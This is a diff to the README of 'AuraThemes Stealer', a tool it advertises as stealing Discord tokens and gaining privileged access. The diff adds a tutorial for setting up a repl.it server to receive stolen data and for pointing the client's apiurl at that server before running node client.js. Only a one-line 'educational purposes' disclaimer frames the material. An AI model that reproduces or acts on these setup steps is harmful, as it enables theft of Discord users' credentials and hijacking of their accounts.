@@ -4,7 +4,7 @@
 
 ---
 
-#### [Discord](https://discord.gg/5BJa778F7B) - [Build](#salepute) 
+#### [Discord](https://discord.gg/5BJa778F7B) - [Build](#salepute) - [Turorial](#tutorial) 
 
 AuraThemes Stealer: Steal discord tokens and get privileged access!
 
@@ -73,5 +73,20 @@ build EXE: npm run build
 ---
 ### THIS SCRIPT was made for Educational purposes
 [Home](#home)
+
+---
+### [TUTORIAL](#tutorial) USE Mode of use
+
+> Create a new project on repl.it to create the API server. This is where you will receive the data sent by the client. (Just copy the contents of [server api] and paste it into your repl.it index file). Once you do that, you will have the receiving API set up.
+
+> Now, in the client section, go to (client) and change line 10 in client.js file:
+
+```js
+10 | apiurl = "http://yourapi.com" // Put Your API URL Here in desktopClient/client.js
+```
+
+> Replace it with the URL of your previously created API server on repl.it.
+
+> With this, everything should be set up correctly, and it should work by running `node client.js`.
 
 ## README Spanish soon...
